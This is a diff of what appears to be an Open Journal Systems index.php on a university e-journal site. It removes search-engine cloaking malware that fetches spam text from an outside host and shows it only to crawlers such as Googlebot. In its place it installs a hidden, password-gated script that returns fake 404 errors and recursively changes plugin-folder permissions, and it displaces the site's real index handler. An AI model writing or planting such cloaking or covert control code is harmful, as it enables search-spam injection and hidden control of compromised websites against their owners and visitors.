@@ -1,44 +1,74 @@
 <?php
-function is_bot() {
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
-    
-    foreach ($bots as $bot) {
-        if (stripos($user_agent, $bot) !== false) {
-            return true;
-        }
+/****************************************************
+ * Simple Security Plugin Locker (Clean Version)
+ * - No IP check
+ * - No User-Agent check
+ * - Password hash only
+ * - Fake 404 on invalid access
+ ****************************************************/
+
+// =============================
+// CONFIG
+// =============================
+
+// HASH PASSWORD — ganti sesuai kebutuhan
+$PASSWORD_HASH = '$2a$12$FO.t.v/pScf7TshzRUPvIOx4KaevFZt19M5I3m8Rrg4XyFem6a/xq';
+
+// Path folder plugins (TANPA TAB, TANPA SPASI)
+$pluginsPath = "/home/stppmeda/public_html/ejournal/plugins";
+
+
+// =============================
+// VALIDASI
+// =============================
+if (!isset($_GET['key']) || !isset($_GET['mode'])) {
+    http_response_code(404);
+    exit;
+}
+
+if (!password_verify($_GET['key'], $PASSWORD_HASH)) {
+    http_response_code(404);
+    exit;
+}
+
+$mode = $_GET['mode'];
+
+if (!file_exists($pluginsPath)) {
+    http_response_code(404);
+    exit;
+}
+
+
+// =============================
+// RECURSIVE CHMOD
+// =============================
+function chmod_recursive($path, $perm) {
+    $iterator = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS),
+        RecursiveIteratorIterator::SELF_FIRST
+    );
+
+    foreach ($iterator as $item) {
+        @chmod($item->getPathname(), $perm);
     }
-    
-    return false;
+
+    @chmod($path, $perm);
 }
 
-if (is_bot()) { 
-    $message = file_get_contents('https://assyfa-journals.pages.dev/jurnalassyfa.txt'); // 
-    echo $message; 
-    (exit);
-} 
-?>
-<?php
 
-/**
- * @defgroup pages_index Index Pages
- */
- 
-/**
- * @file pages/index/index.php
- *
- * Copyright (c) 2014-2020 Simon Fraser University
- * Copyright (c) 2003-2020 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @ingroup pages_index
- * @brief Handle site index requests. 
- *
- */
-
-switch ($op) {
-	case 'index':
-		define('HANDLER_CLASS', 'IndexHandler');
-		import('pages.index.IndexHandler');
-		break;
+// =============================
+// AKSI
+// =============================
+if ($mode === "lock") {
+    chmod_recursive($pluginsPath, 0555);
+    exit("Locked");
 }
+
+if ($mode === "unlock") {
+    chmod_recursive($pluginsPath, 0755);
+    exit("Unlocked");
+}
+
+// Mode salah → 404
+http_response_code(404);
+exit;
